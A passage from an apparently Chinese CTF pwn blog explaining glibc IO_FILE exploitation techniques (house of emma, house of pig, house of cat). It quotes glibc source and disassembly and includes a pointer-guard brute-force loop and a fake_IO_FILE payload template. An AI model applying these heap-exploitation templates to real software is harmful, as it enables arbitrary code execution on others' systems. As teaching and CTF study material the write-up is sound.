rcx</span><br><span class="line">0x00007fa70ef04b5e &lt;+302&gt;:   mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">0x00007fa70ef04b62 &lt;+306&gt;:   mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">0x00007fa70ef04b66 &lt;+310&gt;:   mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">0x00007fa70ef04b6d &lt;+317&gt;:   mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">0x00007fa70ef04b71 &lt;+321&gt;:   mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">0x00007fa70ef04b75 &lt;+325&gt;:   mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">0x00007fa70ef04b7c &lt;+332&gt;:   xor    eax,eax</span><br><span class="line">0x00007fa70ef04b7e &lt;+334&gt;:   ret</span><br></pre></td></tr></table></figure><p>围绕<code>rdx</code>进行参数的布置，就能设置好各个寄存器</p><p>这里最重要的两条是</p><p><code>[rdx+0xa0]</code> &#x3D;&gt; <code>rsp</code></p><p><code>[rdx+0xa8]</code> &#x3D;&gt; <code>rcx</code> &#x3D;&gt; <code>ret</code></p><p>我们通常将<code>rcx</code>布置为<code>ret</code>的gadget，这样在最后<code>ret</code>的时候就能实现栈迁移到赋给<code>rsp</code>的地址上</p><h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><p>可以理解为kiwi衍生出的攻击手法，需要以下三个条件</p><ol><li><p>可以<strong>任意写</strong>一个可控地址（LargeBin Attack、Tcache Stashing Unlink Attack…）</p></li><li><p>一次<strong>任意地址读</strong> 或 再来一次<strong>任意写</strong></p></li><li><p>可以<strong>触发 IO 流</strong>（FSOP、house of kiwi）</p></li></ol><p>利用的虚表为<code>_IO_cookie_jumps</code>，存在拓展结构<code>_IO_cookie_file</code>（还是<code>_IO_FILE_plus</code>加长版），多了一个函数表，存在劫持的可能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p>需要调用的虚表函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里写了4个函数，其实大同小异，都调用了一个从<code>_IO_cookie_file</code>结构体的函数表中取出的函数指针，以<code>_IO_cookie_write</code>为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<span class="comment">//取出函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);<span class="comment">//指针保护</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<span class="comment">//调用函数</span></span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们只需伪造<code>_IO_cookie_file</code>结构体的函数表，就能调用任意函数。同时这里的<code>rdi</code>是可控的。如果要打getshell，可以直接构造；如果要打orw，可以利用libc中一个gadgets</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 8]; </span><br><span class="line">mov qword ptr [rsp], rax; </span><br><span class="line">call qword ptr [rdx + 0x20];</span><br></pre></td></tr></table></figure><p>完成从可控<code>rdi</code>到可控<code>rdx</code>的转换</p><p>此外，<code>_IO_cookie_file</code>里的函数指针不能直接伪造，因为默认开启了PTR_DEMANGLE （指针保护）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure><p><code>__pointer_chk_guard</code>存在于TLS段上，将其ROR移位0x11后再与存入的地址进行异或</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811213323111.png" alt="image-20230811213323111"></p><p><code>fs[0x30]</code>的值位于与libc相邻的ld空间中，这个位置距离libc地址的偏移固定，可能与本地patchelf后不一致，可以通过爆破得到。因为偏移的变化值往往在地址末尾的第四个、第五个数（末三位不变），可编写如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            libc_base = <span class="number">0x1234</span></span><br><span class="line">            offset = <span class="number">0x6</span> &lt;&lt; <span class="number">20</span></span><br><span class="line">            offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">            offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">            ld_base = libc_base + offset</span><br><span class="line">            log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">            <span class="comment"># your code</span></span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><p>详细题解可以看<a href="https://deepunk42.github.io/2023/07/27/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/">另一篇博客</a></p><h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><ul><li><p>用于程序中只有<code>calloc</code>而没有<code>malloc</code>的情况</p></li><li><p>通常需要<strong>一次largebin attack</strong>以完成tcache stashing unlink attack的准备</p></li><li><p>需要<strong>一次tcache stashing unlink attack</strong></p></li></ul><p>调用虚表<code>_IO_str_jumps</code> -&gt; <code>_IO_str_overflow</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><blockquote><p>打tcache stashing没有<code>malloc</code>取不出chunk怎么办？</p><p>我有<code>_IO_str_overflow</code>！！！（自豪）</p></blockquote><p>这个函数中，完美达成<code>malloc</code>、<code>memcpy</code>、<code>free</code>一条龙服务</p><p>什么？你的版本太高打不了<code>free_hook</code>？</p><p>没关系，最后还有一个<code>memset</code>可以写libc中的got表</p><p>如果需要打orw，<code>rdx</code>也是可控的</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811214840282.png" alt="image-20230811214840282"></p><p><code>&lt;+53&gt;mov rdx, QWORD PTR [rdi+0x28]</code></p><p><code>rdi</code>指向<code>_flags</code>，<code>rdi+0x28</code>指向<code>_IO_write_ptr</code>，可控</p><p>详细题解可以看<a href="https://deepunk42.github.io/2023/07/27/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/">另一篇博客</a></p><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>只需要<strong>一次</strong>任意写！</p><p>调用虚表<code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终目的是调用<code>_IO_switch_to_wget_mode</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">► 0x7fbbb9489d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7fbbb9489d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7fbbb9489d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7fbbb9489d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7fbbb9489d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7fbbb9489d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7fbbb9489d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                </span><br><span class="line">  0x7fbbb9489d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7fbbb9489d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7fbbb9489d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p>这里call了一个<code>rax</code>相关的地址，而<code>rax</code>由<code>rdi</code>决定</p><p>再说调用条件，需要满足两个</p><ol><li><p><code>was_writing == 1</code></p><p>即fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_ptr</code>    &gt;  fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_base</code></p><p>这里用到了前面提到的<code>_wide_data</code>跳表，可以直接伪造so easy</p></li><li><p><code>mode!=0</code></p><p><code>rcx</code>&#x3D;&gt;<code>mode</code></p><p>如果无法满足，可以再做一个FILE结构体，进入第二个结构体时就置好了，详细内容参考<a href="https://phot0n.com/2022/09/06/%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8EFSOP/">Photon的博客</a></p></li></ol><p>构造挺麻烦的，理解之后可以直接上别人的模板</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> # 伪造的fake_IO结构体的地址</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="meta"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="meta">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="meta"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  # rax2_addr</span><br></pre></td></tr></table></figure><p>详细题解可以看<a href="https://deepunk42.github.io/2023/07/27/house-of-cat/">另一篇博客</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of cat强网杯复现</title>
